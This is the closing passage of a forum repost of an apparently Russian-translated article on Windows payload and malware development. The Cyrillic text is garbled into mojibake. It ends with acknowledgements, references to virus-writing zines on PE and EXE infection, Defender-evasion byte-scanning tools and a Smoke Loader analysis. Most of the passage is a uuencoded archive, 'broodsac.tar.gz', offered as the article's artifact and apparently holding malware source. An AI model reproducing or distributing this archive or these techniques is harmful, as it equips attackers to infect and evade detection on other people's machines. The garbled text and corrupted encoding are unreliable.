–ù–∞–¥–µ—é—Å—å, –º–Ω–µ —É–¥–∞–ª–æ—Å—å —É–±–µ–¥–∏—Ç–µ–ª—å–Ω–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å –≤–∫–ª—é—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º —Å–±–æ—Ä–∫–∏ –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤–∞—à–µ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –•–æ—Ç—è –º—ã, –±–µ–∑—É—Å–ª–æ–≤–Ω–æ, –º–æ–∂–µ–º –æ–±–æ–π—Ç–∏—Å—å –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç–Ω—ã–º–∏ shell-—Å–∫—Ä–∏–ø—Ç–∞–º–∏, —Ä–∞–∑–≤–µ –Ω–µ –±—ã–ª–æ –±—ã –∑–∞–º–µ—á–∞—Ç–µ–ª—å–Ω–æ —É–≥–ª—É–±–∏—Ç—å—Å—è –≤ —Å—É—Ç—å –º–∞—à–∏–Ω—ã –Ω–∞ —É—Ä–æ–≤–Ω–µ –∫–æ–º–ø–æ–Ω–æ–≤—â–∏–∫–∞? –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ Linux –∏–º–µ—é—Ç —ç—Ç—É –ø—Ä–∏–≤–∏–ª–µ–≥–∏—é, –ø–æ—á–µ–º—É –±—ã –Ω–µ –æ—Å–≤–æ–±–æ–¥–∏—Ç—å —ç—Ç–æ—Ç –¥–æ—Å—Ç—É–ø –≤ Windows? –í –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤, –º—ã –≤—Å–µ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –¥–µ–º–æ–Ω—ã –Ω–∞—à–∏—Ö —Ü–µ–ª–µ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º ‚Äî –º—ã –ø—Ä—è—á–µ–º—Å—è –Ω–∞ —Å–∞–º–æ–º –Ω–∏–∑–∫–æ–º —É—Ä–æ–≤–Ω–µ –º–∞—à–∏–Ω—ã, –∏ –Ω–∞–º —ç—Ç–æ –∑–¥–µ—Å—å –Ω—Ä–∞–≤–∏—Ç—Å—è.<br />
<br />
<b>--[ 7. –ë–ª–∞–≥–æ–¥–∞—Ä–Ω–æ—Å—Ç–∏</b><br />
<br />
0x6d6e647a –∑–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ, dc949 –∑–∞ —Å–µ–º–µ–π–Ω—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É, slop pit –∑–∞ –º–µ–º—ã –∏ –æ–∂–∏–≤–ª–µ–Ω–Ω—ã–µ –æ–±—Å—É–∂–¥–µ–Ω–∏—è.<br />
<br />
<b>--[ 8. –°—Å—ã–ª–∫–∏</b><br />
<br />
<br />
[1]: 40Hex #8: An Introduction to Nonoverwriting Virii, Part II: EXE<br />
     Infectors,<br />
     <a href="https://amethyst.systems/zines/40hex8/40HEX-8.007.txt" target="_blank" class="link link--external" rel="noopener">https://amethyst.systems/zines/40hex8/40HEX-8.007.txt</a><br />
[2]: 29A #6: W32.Shrug, by roy g biv,<br />
     <a href="https://amethyst.systems/zines/29a6/29A-6.615.txt" target="_blank" class="link link--external" rel="noopener">https://amethyst.systems/zines/29a6/29A-6.615.txt</a><br />
[3]: 29A #2: PE infection under Win32,<br />
     <a href="https://amethyst.systems/zines/29a2/29A-2.3_1.txt" target="_blank" class="link link--external" rel="noopener">https://amethyst.systems/zines/29a2/29A-2.3_1.txt</a><br />
[4]: <a href="https://github.com/Adrianotiger/desktopPet" target="_blank" class="link link--external" rel="noopener">GitHub - Adrianotiger/desktopPet: Remembering the lovely eSheep (stray sheep) from 1995 -</a><br />
[5]: <a href="https://github.com/commial/experiments/tree/master/windows-defender" target="_blank" class="link link--external" rel="noopener">experiments/windows-defender at master ¬∑ commial/experiments</a><br />
           /VDM<br />
[6]: <a href="https://github.com/matterpreter/DefenderCheck" target="_blank" class="link link--external" rel="noopener">GitHub - matterpreter/DefenderCheck: Identifies the bytes that Microsoft Defender flags on.</a><br />
[7]: <a href="https://github.com/rasta-mouse/ThreatCheck" target="_blank" class="link link--external" rel="noopener">GitHub - rasta-mouse/ThreatCheck: Identifies the bytes that Microsoft Defender  / AMSI Consumer flags on.</a><br />
[8]: <a href="https://techcommunity.microsoft.com/t5" target="_blank" class="link link--external" rel="noopener">https://techcommunity.microsoft.com/t5</a><br />
           /security-compliance-and-identity<br />
           /enhancements-to-behavior-monitoring-and-network-inspection<br />
           /ba-p/247706<br />
[9]: <a href="https://en.wikipedia.org/wiki/Leucochloridium_paradoxum" target="_blank" class="link link--external" rel="noopener">Leucochloridium paradoxum - Wikipedia</a><br />
[10]: <a href="https://www.sentinelone.com/blog" target="_blank" class="link link--external" rel="noopener">Cybersecurity Blog | SentinelOne NL</a><br />
           /going-deep-a-guide-to-reversing-smoke-loader-malware/,<br />
           see &quot;Decoding the Buffer&quot;<br />
<br />
<b>--[ 9. –ê—Ä—Ç–µ—Ñ–∞–∫—Ç—ã (–î–∞–Ω–Ω—ã–π –∞—Ä—Ç–∏—Ñ–∞–∫—Ç —É–∂–µ —Ä–∞—Å–ø–∞–∫–æ–≤–∞–Ω –≤–æ –≤–ª–æ–∂–µ–Ω–∏–∏)</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>begin 644 broodsac.tar.gz
M&#039;XL(`````````^P]:W?;-K+][%^!9KNI9$N.93O&gt;[&#039;7L&lt;V1)KG6O+/E(&lt;K*]
MV5P&gt;2H0L-A2I)2D[WC;__&lt;[@10&quot;D&#039;G;&lt;;;MK?6@L&lt;#`8S`SF&quot;;&amp;C.(J\Q!V_
M:ERZGVC&#039;3])D-_V&lt;?O.4GSWX&#039;!T&gt;XK^UO[S&gt;T__%3^WUT&gt;MO:H&gt;O_[)_N&#039;^X
M]_KH&amp;QC9.]C_ANP]*15+/HLD=6-&quot;OIDOXGE`E\.M&gt;_X&#039;_8QG(&#039;9GYH?^;#%S
M8OJ/A1]3K_2NU1^T&gt;UURL%M[7=[:FL?13W2&lt;ED9&quot;6TB#U`&gt;73A?^4]Y*:%IJ
M7-;_I^5&lt;#MXUG/YU=]B^;#F=]EF_WO^1O+A&lt;!*D_G,;4]:CWW=OOWC9ZW?/V
M#__5I*/%S:GXYT5Y*YJG?A26SOJ]7G-0;SC-UMGU#^3%&lt;!&amp;&#039;)`J)AW`W?GA#
M)E%,S@0E+TCO_)S3H&quot;:VN^&gt;MQK!^UFD-R(L7I%%O7+3(8-AO=P&#039;=@*8DG5)`
M$G@T-G&quot;1-&quot;)^.(&amp;-5F#!X)[$-*&quot;W;IB2.S^=$I,P(&#039;C+]3PG68P\8-DXC&gt;+[
MTG&lt;_7_5[_PV+.X/&gt;=;_1&lt;IKM_I=7&#039;&quot;?L[96;S%X=[)&lt;?-_&#039;H4&quot;Q)/]/Q(G5&#039;
M`&lt;T$\K[=/=@G,]&lt;/=\?E+5#I&amp;YHZ@1]^@O^,8C?V:9(!*[P.X&#039;5@GCG`%O(G
MQ!)%&gt;8L0KBYS-YV6ZF&gt;#7N=ZV&#039;*NZL,+4LC\;J]_6&gt;^T_[=E3&gt;W6A^UWJR86
M#2*.)(U!`4K]UE6GWFB1%W__^PO\#_Y3+/WO?BX:__(&quot;D0DFC:/9W`^HX]$)
MG`)D@L:IJ^NS3KL!P,02OSFDX3Y9L28-/7]2*F_]UH=&gt;^\B=ON*J\ZNLL=+^
MU_9?&#039;[S6[/]^#&gt;S_P0&amp;X@6?[_R_X_,D/Q\&#039;&quot;H^1MDGI^F.Y.3[?,L&lt;@&lt;NO-#
M+[I+&lt;H,IC&lt;/`FCT-HM%/.+;U:IM&lt;^N,X2J))2J9N2A,RIQ$PE`3^)TH6&quot;4DB
M-,OWQ(O&quot;[U/&quot;#B,E]);&amp;]^D4C;X?XG,_)E/T(W%2P1,X6H!MIL2-*=CJQ`]\
M&quot;L;:#3V23&#039;&amp;LH8#).)K?(X*$RC&amp;T]G,_24@TF1!7(\^CMV3[U59Z/Z=`!MJ&lt;
MQ3@EY]&gt;=CG/5.G,ZS;[3K`_K6S\C!=&gt;=&#039;GB5#@UOTNDQ#ISU&gt;IU6O4O::$O&lt;
MP/\G]=CX1;W;[(`;2BZ`OH&quot;RL4Y[,&#039;1:W2%XR7;8B5RO%P-EEY&amp;W&quot;%@HE@&gt;Z
MI#-P%VO!U.(NVK,B\*MWO7:3M,(TOF^&#039;5W%T`_Q+C`T,IHL4)!U:C^4^Q%/N
MU]NPQR]Y%E7(]E5N\&#039;BKD+7RL&lt;/,)=\)9_$R/G7`NW&amp;:EC-I*4P!AW18SIYF
M$)RY&quot;37&amp;&amp;,NN(E!X,&lt;PU8`&quot;&quot;[DW:,_=&amp;@E]WVXU&gt;L^6(P.-\$02`K^O.E@#@
M2A8`PWP&gt;N#&gt;2K/&gt;]?I,@`QK10A&#039;`!H=!T@X]^EF,+4+8%?]3\-!FP86;3/4=
MLP\7B#:@3]:8,.#1`F,#C8]M($YX8TK&#039;GP:+F?[XB_CR936=&#039;,&#039;0G]$FV(I!
MZL[F.A9.!/*!&gt;NW9/(K3Q,)KRZH.]-XR43&lt;B(/ES:L!=N&gt;EXV@XA%IPQF+S&quot;
MG$?QG;M&quot;H08TOO7&#039;=.C&gt;+`-(`?-8//RR7.75D2EZF#\ZCG/EW@?`&quot;.&quot;3RUFX
<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="185558364c">[email&#160;protected]</a>&gt;[#LI24`EC^7(&amp;QCP`.9#[2.NK\T&quot;I,`/L-[Z()GSOP_VCU&lt;\/3K4*+J-
M?(]LD](V1*%!$(TOF)DMEY`,)RT?%P&quot;&quot;Z=`A^8,**9X!\).84A-8`QJ#R&gt;=H
M@3?AV$TE)&#039;^`+B!,4B*_Y18!)LG)_G@V5[.-66MP\`&amp;!)J!A$9)&quot;3LSH;#R_
MMQG!IZUFBYP.&amp;9`]&#039;7:T?)^XHKW+#=&gt;]N.PUK\$&#039;`!8\@QV68-S7):[.50-,
MF@;?9!8*H&#039;^@Z9#.YG#&lt;IOL*G#VMD,[5\DGG$)_74XC]P=_39/E&quot;PC?!I`:H
M5DK9/!.Z0L1ZV;*MQG6_/?S1J0_!$)]!1C.P@3C&gt;%&lt;2A]9?K&lt;&amp;#$S*&quot;T6&gt;A9
M&lt;5(?(&#039;%6?@9:(XTT]4&lt;/\O%._&gt;JJ583N?&gt;SSK&gt;;Q-1Z%L!%$&quot;&gt;5ABHFRD-7G
M$!&quot;&gt;^W&amp;2%G*[&lt;\4R4^&gt;\W6TR&gt;U8O6!!1=,&#039;,&amp;!BR7:S`&lt;-%O#:X[0U)R&#039;(A5
MQV!.R/;@`J7&quot;TGO4M`SA^VY3&#039;`J)V]*]O&#039;5ML\0XBMOU(0]&amp;()&quot;=);?C.,40
M$;[KMDY\83;7,&amp;WR&amp;WN2&amp;3&#039;V)QLS+);\IIYDYDA]E&lt;^4C1%?V+AN3,07.:ZL
MA/BBX-4*_`OP@F_V$YA^&amp;ASLB^WFSSL)LB&amp;&amp;K4@?R$0?5&amp;&quot;6S!F4&#039;&amp;-`N6-,
MQFJ$`&gt;3.&#039;[G)1AB$&gt;=A0$IZ:;9T&lt;&lt;B&gt;_\\7M8T#&amp;V8AB4#*E0&lt;:?8MUC1*E!
M]+^:7AVS[`A+4HUW;(Q,%B$+KR`\3&gt;_)/(YN?0\2)I&gt;,W,0?DT8U2&gt;\A&lt;X+&lt;
M*`$HR%_8[%L^&amp;3(NBB&#039;&lt;-F9,C9V=78BQ,-U)@6S,HW@292Z13*-%X)$1A&lt;5H
MB@-I[/HWT[0ZX7&#039;/[E9!1N0X@F!^,H3O0R!&#039;A1YBD`9T!JD9CXNX7_%8Z/%%
M;IIS(8EFE-P$&quot;PIDNBG!BE$&quot;6=S835*DW85L,4TQ:81LA&quot;QN@GLDZT\B6&gt;RW
M&amp;O7!L)16:)F42FFY1,ME];#QKM48]OH.`[FMI.4,O&#039;1;KIXB.7GHLQ_!&amp;\!S
MP(=`:F_H=7%`[JO,J&amp;=G&#039;+03Z)2BY-+`\B6*&quot;#+/.5(LGXZYS!PVL:3I!-GV
M7&gt;6[,Y96;&#039;Z6.&gt;LE/DC2%D$J[`_^N9M1?$+V]`&lt;2@SV.?(&quot;Q+H2@7,6Q#JAA
M`?&quot;RB,1!5;`T*Q==LJJF#Q)=MO9&amp;V#12#3TR*0:&amp;54^Y`2Z9XGO)`&lt;ME-HO#
M,&gt;-7TC!4R%Z%K)IGT?&gt;%21P-N&#039;ETXVAFB)HINY0S@A&gt;(64[&gt;YF!&quot;J,@I&lt;:9/
MN$#(+[^(4\[U58Z;+!1\UK:ISRG8IUA58P^C4Y_%GYEK&quot;QW1QDV=XAP2GJ_P
M5-CL$;#K.;3L&#039;.199K,&amp;_BS40F2M/F!OB&gt;&amp;1&amp;:HA3D:?8.%Q?K4O6YH9!!?@
M:$RR%UG&amp;S,+GNMI+QIF&quot;7B9ER0&quot;#FK?$V*JE0:;U%#*0:&gt;5V&gt;4&gt;MK%M(&#039;7^9
MZ5W&amp;\ZKY%*!S&amp;,I2A?PPH3&amp;6]22)&amp;,-%_-A5A;A=WM2Y\6]I&quot;(\]^IGU;&#039;C1
M4+I&amp;6]\XX@&gt;H&amp;T-&lt;$0Y,$+/RM$J&quot;5QU4F,@)/LW+_N7+_-BW.:.9(5IJ&#039;:3J
M;DL:+=^C:;$F@@JI*9V6Z@#!I*5G@K*&quot;^&lt;L/A&#039;WDM?4KN2WOU,HVK[Y=&lt;T1!
M;&gt;XH\2+BHV+X&quot;;ES[UG!-Z:W*!`O8O%$&amp;(%ZR+C]%;/F/RT@]66-0*9U/*S#
ML!VX5I)Z&lt;%([)OY;FX(JH^V8[.SX4D!:44O,3&gt;*QP_&gt;0WT+5K]:.&lt;S.\)%TQ
M0X/G&gt;@D+`*&quot;(;F0.7W2`UYU?16FYG%L$:&#039;J:1=3FC$5T90.(&quot;M*R2K^^9)JE
M3WT,09R8-5HM?=LLNJ6Z85+N7UF0G(O#*0\U.2MMC#`&gt;2P[$4FM3&lt;(*J-=OV
M?R43[;HP(8_2$4XQ6(%&quot;C(4SBH\F;+&quot;L8H`&#039;F:!J34E]ODBFNLR%ZZ&amp;A)S.Q
M9&lt;+&#039;F9N(_DG]B^7L5NY2:?TF*@Y_P-&lt;U6_;H/Q9TL9&#039;&quot;;[;K94HMR?O6!-,5
M.7&gt;BN?LJ.M^F?K`C:S!NCS-(E=HGX&gt;W!?LTUZKS\KH+8B(*&lt;NLGTU@TP1/[\
MIE8;_]4;O^;KW4U]R&amp;Q+8E[FYJ4+D3/_[T3BWMDYMIYM(]H:=M7_&gt;J!Y6Y&amp;[
M&quot;&quot;A&amp;NJ@-8F7&quot;F&lt;?1V!G=._A&lt;;.&amp;J?5G_H&gt;4T&gt;P/GHE5OMOIDQOJ&#039;%7,G9544
M8T?@,[9BB+K5@LKADJL6F&gt;#.(&amp;4&#039;[OMPV.ZQP)RZH)&amp;H6-P&lt;`6CHSJC&#039;-K2M
MZA.)+&#039;]X9,3ZMZ39Z&gt;SB&#039;S$E/M9$&lt;!9QX]B]KV38U&#039;&gt;)SU48^3.&amp;(EL:OV2(
M@+PXI@&#039;K4HM`4X&lt;4*+652.E3&amp;-T!ZH0!1[&#039;GAR`-]@Q&lt;&quot;4AV/,WJ.!D^&amp;&lt;=:
MFU94,&quot;:A,D2+6%Q744`2K&lt;^8&amp;-^ZQ/4\[-(2`Z&lt;UZ_L$T&#039;ITEP=%:D$Z8?=_
M;BG(9DYC;(0QM$*OF:R):-1M9]P2G,N$)&gt;)M+PC(`F0=8/B%13UX`I$KIZ5&quot;
M6-!UYR?`AE2@Y!J:D&#039;`1!+LBZ&amp;*&#039;D&amp;DC5\;N4.CB@&amp;R&#039;J2/;^&quot;H,609;,0&amp;4
MMZEPE2[O\&#039;_!##K!Q`WI&#039;?&lt;1.KK6WZYZ_2%&gt;RF+&gt;ZT&gt;P4TS7G4S7%1DR25PY
M73JR-91EVZR&gt;]N:\8,=+BKO8AVO*U3^(XRH7X.U&quot;L&gt;[&#039;W7=^G&quot;[&lt;H,X5!)?6
MM\B;&amp;=LH46?..[HYK@J8RAIZ;:Y43\6:O0GVM1-]66U5&lt;6!RJS[)HCV!O&amp;#+
MF&gt;(^^7;/)6KA35CZH&amp;RG?[*&#039;&quot;41^?G&lt;Q&amp;]%8&lt;&quot;O+)&#039;XVE(K[%W8&quot;+;I%8W*=
M5NF2_N!_%&quot;0*3RI]&amp;4*5T0UQ0Z_B+31+?KB@:I+P+F)1V71:0X-B_0=#`X&quot;:
MC^6\Y^*E)AZ2`,9;5@\0V7[_71WMCBL\E&quot;PN@15TL38^22C+XKA(P4XZ:&gt;3P
MX9**0:1S4T#&quot;L5W9UN1@GQ29G@*XBA&#039;IZMY3A+I%SW-NMVQ;)9$69$3(.BO^
M$TUX-[6\([YQ=.?M3DOB,TQ*UOK8Y?=73!O#%N0H!D!KN]&gt;5P&lt;!V(JZ+LENH
M.=MW531)FKRGYLN.Q0MAWM2A4SD[.W)+MB_/G;C84G#T\&amp;B@EX5$R]@\:*QE
M7[%J@Y!OUP&#039;NY)Y?^LE8`J%$M&amp;,GZ\^`N+J6@IT\A+BK,XSZ[AV_]F$?,E6S
MY3TVYLDA#,+BK&gt;[&lt;LR&#039;&quot;I1_2,:SI@@]$?F.HXH=X!&quot;%F&amp;W8&amp;6CBHD@.&amp;WTF#
MQ-&#039;PK\H1I)H4*R,H@2/VJ\W11AT&gt;Z;-VLQN/ITYRYZ?CJ1:;,]T;W0-5PHJ&lt;
MK--3KF&#039;J_M+/INIGEN#H$`XK7I19\IQ9%+QF@^+0SK5J,-Z(&quot;^O=H;JYB&#039;RF
M+@1_N!D1+:%^&amp;GOCZV4(=Y&amp;,%2;KZ+&quot;B,&gt;&quot;1YHD&amp;&quot;2U:&amp;7:YTEA^_&lt;JKI`%J
MF,5&amp;P`30O)Q$#!@@%V&quot;45%!3YVF&lt;$PFJ]R-D(M#M,C)L3&lt;NK;?$F&lt;OS6L#)N
M/P+KP7[&amp;2Y&#039;3`3;M!$,H`!N%$YZE&amp;RRA&lt;&lt;$C43CO\CB&#039;-Q6\T`L@\#&quot;&quot;0!_,
MELJE=)O&quot;^93U+[,GA15JP\GQ-!RF&lt;Z\MKO.C@3PAVGZKIZ9Q5#LL\`Z&#039;!2&amp;7
M7KQA1+S4R(1OV;IF&#039;%4@&gt;$)T*G=.R!NIA)H&lt;&lt;T&quot;&#039;PE1G@A$&amp;6F&lt;7;@9OOR&quot;#
M\1K,R!U_4B;;%.)RW91[Y@R5:`1+#:W5(MV&amp;B[=D&lt;;6J;6UR20N[&#039;ZM=J96B
M`]1J-1&amp;RG9CK5]&gt;*5%AR(!&#039;MLYH,WS/3HP%4UAT0+20IH&quot;^3M:S;&amp;&quot;OJ31JM
M![!6F?0]ZP5Q@Q&lt;[*MI3^RF$A2=9B&gt;B+4B*I:YM*^V!_$VDCU+]&gt;VBR;6B%L
M_OS?1M:XG8U%+8R%1R&#039;LF^&amp;M%C0%@0OIF!;&quot;&quot;0L1Q?X-JUGEHCMN+41BA`\%
M4[+2ZS(KHD.#5,S4*]N#\/#9P#HCLDGEXZP^:/5;G5ZCJ/A!9/VC\#@\&quot;=D%
MI^&amp;)R=;24YSEL&amp;EUC(OQFAC5(NM&lt;Y&amp;7!5X@&gt;?&gt;G;+QN5:0NM?2R-&lt;_!0$K0C
MR^L$-H;R3FYYGK*&gt;P&lt;&quot;GL@K-A&amp;MTT8#HRCQ&quot;,$.9V8C,GK63F=TWVI9&#039;CX4;
MF%3IX0&lt;\WE]^&quot;)Y&gt;CW&amp;[:`XRNM=$W+_2@EMY\&gt;94P8H^#&lt;,G:FOE#WL?R4NR
M]_D&lt;/WM[_!;:*B$3DQ0A&lt;!^L&amp;TH\NJ4\^=2$SJ)._#G8&#039;&#039;_@@89NEMT=66+I
M.&#039;790X&lt;7XY4&quot;FY7!3&amp;%S^FHHR_;^\I)$D&gt;X5UQ\*E$QS.)KVAT3^.E??IKK+
M(*V&lt;ML$/_D?88ZFV1]Z^);7],OF%E);+D&quot;@A^DJ(9C/&gt;U,QB*LE%^X&gt;+3N_]
M`VD\&gt;&quot;(2S9LHV64N&#039;0WO\ZG[FKQP&lt;;`_\E-6OA!1Q).4+KZR&amp;D&amp;^KEKY]0GX
M[[LR65R2_)I=VW7&#039;+&#039;66G-#&quot;S.P*KC!;(PKQ%E&lt;H&lt;2N;&gt;:RB3&quot;V&#039;)XL)E^7P
MFC;8=0V\=X&gt;JJW&gt;NU$W.XBE(@#$E,[X3K14;X-WZ&gt;SC6QB;$3V_]5,L[O[*M
M!?3E*IZY=GG1/DU=L+9I*(,9]&gt;5BO2?[/#TGLGM4^MV&#039;ESD95O(&lt;JJQ6*[TO
M8U:)F&lt;#QRJ&amp;\C1EZ1B%&quot;NX!)LFH/6YO?8EU&gt;ZA$FKJRN(NJSLT+&#039;.A0L&lt;&gt;(%
MHR+5#9$9UN&#039;#38@&#039;F`E$$\)SQ;PZYU5-W$+!3D#N(&lt;0TJ1NG*J,6]?B\!A=&gt;
M4&#039;HIN58@O^II*_1R&gt;*L;DU`V\W1&lt;150#-MY$=95&amp;Y^H!NH;*?8G;^&amp;L/HR(/
MQ*KFJJMOIJHJ6&gt;-+`7+5L9SHL[&lt;%S+Y&quot;R@4EDYR(&quot;TLOF^%Z&amp;*&lt;+:B567*M5
M2];SWBA=9.41+]JH#&amp;(&lt;70T9HVAG)\,G.)^C64LT&#039;[=(%@CF2SI\#28J4XO&lt;
MP+\1]UM0U?&amp;&gt;#E[5@5@0?_M&amp;#JO(-S**%J&#039;GHA*-Z-A=))2TB3L#&#039;[J(H]0?
M&quot;X42(0)#286X49_ECV9LA39^N5`\Z\_DT$C!BZ$@=B@=@O(LQ9%92)I@#.4G
M+&#039;$BZF8(9C&quot;*&quot;2L*S%FQC^%7!14[G#DN`,9WLFQ0RH&gt;4W,)?A(R&amp;GE;4M/#O
M+.%U4=!5R#,%;1S9W6+SN(2$C4]R?ITBBW^2W_NF:Q3[=G&#039;[3?UJQ^`Q&gt;[BQ
M&gt;#GTII+5&lt;2\5BY%?+&amp;&amp;3XE%;7*0W:7D@&gt;[@EP&amp;*#H(49`]L&quot;Z`&amp;O3;9]6(OV
MA&lt;&gt;T&lt;*;1I!.BXFUW\1:O+/#&quot;($;\DL%75Y59[L&#039;O%4[,.(W;/EO&quot;^6+]&amp;B%;
M#FV]G*T5CF4BS!S2/&#039;#&#039;=,I?UX;W6^MG]6:MV:H?Z^F[?KW9MOU[,*0AR2P&lt;
MWC8DO#HNU=UB!0C/3[]/2!BE*L&#039;)Q&amp;I6&#039;ZQ5,X=:_F`\VLTNE7_,AP1JVC]I
M&#039;*E?9V[DXU[B%,MI):)5C&lt;FEO&quot;`JI(XG.PN&amp;EN&gt;:UJ\BC46Q*EH[.B:O7K%F
M;^V(!6X)F&lt;,W5##I`T&#039;Y[N1OC.^H&#039;WO8#)ZZ&gt;+4\2&gt;AL%-P+_P%_N!,0&quot;7BY
M&amp;]&lt;/*\IQEM&lt;&lt;[&quot;PR.LGKX`//=TR9NK!#I6O?K8L_368O`Y0\U&gt;[=`EMQ@G&#039;V
MW/$X@J!)GE#QWI0&quot;&amp;RK?O[&gt;Y&#039;94S-K&gt;EYAHBF]I0@_&lt;^*J.I+_Q`WV6KEGK+
MS*Y1T]655EI8_LL.6TFKI_:5J2RB%2]WL-&lt;MV]3((G/F/M&lt;BR$6$!I6BP,QN
MO3,0]LN$U6[!)N+/JQC+7HB@$&quot;_Q(S9&amp;C/PVQEE](N+*Y9Q0\8ZJ.X8C[B=P
MK&#039;E]7K]-+EE9(.N&amp;-?5$U@`;7:?1&#039;3KX.BWRBS78[K:&#039;;?862O[Z$`/@LG7I
M]%OU9F[P?;\];.5&amp;6W]K-:Z&#039;+&gt;.&#039;Y)B\&amp;E3BW=T*&gt;3&amp;*]_;8&amp;THKY$V&gt;&quot;V;$
M+()K#*?13(S`&#039;V7EOZ&lt;OEJV_&#039;[-B4&gt;U-9\H]&lt;;L41&#039;&gt;0,PB#)!H[\#DN[D0+
M2R=_0X`O!X&#039;C&lt;Q/Z$W^,[UR5&gt;C&quot;Z1Y,<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="560c6116676f1f6f6619177802">[email&#160;protected]</a>=IO;;(HE+_-DB2-V0
M1HL$&#039;8I83LYB9U,LYS/R2^Q7$#Z[F&gt;3.YW$TCT&amp;J^&quot;,(N:+Z&amp;&lt;54OC&gt;0HP%!
MS=A;YOC!XY)ZRNNF&amp;PI@I^`VJFT1C5M)&amp;^)=&gt;&lt;(%U&lt;46Z&quot;&amp;T&amp;SG\0Q:L_CH;
M,2]PK;MD^U93&gt;&amp;WWQBE8@\.,U4S5MNQADOUH2O_-C1OHOSR4K9ZUEL/2H8SF
MHA10=\-HK5EU3%XV4^](9O4`L\)K7[39L-*[W/.4&lt;Y;7#&amp;!6W&gt;R!^+B@&quot;+Y!
MQ?MQR^U8E0FM2EGT&gt;@95U_WZ1:UDJF*6RI&gt;OG@7U7TV&quot;&#039;6MB`J9&quot;/?8:PKV/
M%2OZLWYVJ?5C%6N.5P!DU,N7Q[!+[3:I1?W&lt;H\,_2#^7W27?H)_[)%&gt;YG_NY
MOXM^[M&#039;ABGXN*,1#^[FH0_\!_5SK&quot;#SW&lt;_-J]4?NY_)+S\\-W&gt;&gt;&amp;[G]P0]?^
MJ4-!1U?^V.&amp;YI?O&lt;TGUNZ3ZW=)];N@]KZ;YY2$OWS=J6[ILE+5VM0/QOW&lt;_E
M[LANZ#;V:LW&amp;WOEYJ_4&#039;:.D*C_K@GBZ?]]S4?6[J_O9-7:7#OVI7]^CPN:O[
MW-5][NH^=W6?N[K/7=WGKNYS5_=WT-55=&gt;_GKNX3=G4AU+.[NB+Z^PVZNIQ,
MA[O;]:W&lt;Y]_=_COT:8N)PK&gt;=2$4!FEZ:AGM#-U[%_V7BTB4T57ST&quot;A^U&lt;$M7
M;94WZONHGMJO\H-\S00PK&amp;M!7J.;?K&#039;&amp;8[(;2=_79S42$SBM1R8S#Z=%ZQR&amp;
MX!893L8&lt;)ASTO&lt;I&#039;BY+XT@!^A6AQ2[5\GL#?RJR*#&#039;FQ%.1).;&amp;?%+`PGP;G
ML@135W)EA8&gt;KDK6-6X[Q`4FR1&lt;/CP]25!9.5NE48C#X5C4+5E@503&amp;;LY913
M-\%0IL)&gt;(F@TB%:L=NG&gt;^&amp;/LH&quot;GWTKOZ?_:&gt;M3N-(TM_7?^*MK(C@X40;TGV
MVCDM:$E,$!!`=C*6MT_3-!(;!`S=&gt;DTF_WWKUJ/KV=&quot;2&lt;.(YQWU.(E./6[&gt;J
M;E7=JON&quot;+&lt;INN:&gt;-7KGDHN1F7;Z&#039;&amp;%BX)-\6^,QD)Y^HW\3&gt;,&quot;G2ULKQ?9;W
M(SS&#039;K#GL7_&amp;]=6RW^DZR%Z?D&#039;NK:7H_HH&gt;SGUG3VURI&amp;GU`T+?OU!V;0.Q?&amp;
M11&amp;8OP:7^8*[%8%GAJ=&gt;V6D2\]@&gt;,1?T21I-0*!TC-A*3/#QFC34E(V7V4_H
MD+)T2/BUE#&gt;.V*\[&lt;^BTHY&amp;%HF`@,L=2&lt;#@&amp;2OZ57%GU2P.@)&#039;Y:!9&#039;342-M
MK&lt;(X@7%6JX@&gt;XRA)Z-&#039;L\/XS84P^&lt;&quot;^K6.?@/G&quot;&#039;-^-QL.0A(&amp;Z#Y63\8+BQ
M:K$DWHSF(5T8*HO-`1N80.YNBP,`QO`:[X&quot;OW@LM]9LG;7MPWG.4^()\VY#&amp;
M(UV$`6VQYY)P%V9:1C7FW$T;&gt;Q^=%QY&quot;,^!]06VMZ0H=?&gt;:3%COX8UP$XNKH
MK*&quot;F[H+7()JA(B\RS\&amp;(1()`J/LWHANL_\1;1=)D6&amp;MFXZ^Y43`&quot;B+&gt;-ZT5&amp;
MYKU,3\ZFF)DR(8A;_6(1S&quot;!V&quot;CX!U4!%$`!D@E5_YA#C=?J`X(U!KH&gt;CGP%U
MT&amp;?2S&quot;2RKB$&lt;+`CZ0JPP(3Z0DGO+U[FS,$$ACAI#N$X(X`9&gt;A6\NK]!9=HL2
M1R+Y@A]B_/0[%&amp;\S:`RF\ZEP7&amp;WF&quot;O.\Z\LFKBZR=(5&quot;0C.+(^1&amp;5QYAR;UK
MQ(&#039;C5WDBR:47&amp;CYL.3/-Y&quot;@%P/L@CJ&lt;W&gt;QU9=QZ^*2%RRDA4`5P&quot;/FX$VJ`4
MJO3TPWN++T\Q_B4ZA[&quot;&#039;&gt;&#039;A`HB&lt;1*`)X&gt;I!&amp;(4`4^I48&#039;&gt;H&#039;5(#$]!UEW#.W
M^&lt;M!#9?I=ITC:Q$,A2T%I&gt;1&lt;T,T&lt;C&lt;/1W7PYRA3NRP5X-?LAF,I@[+-&amp;K;(&gt;
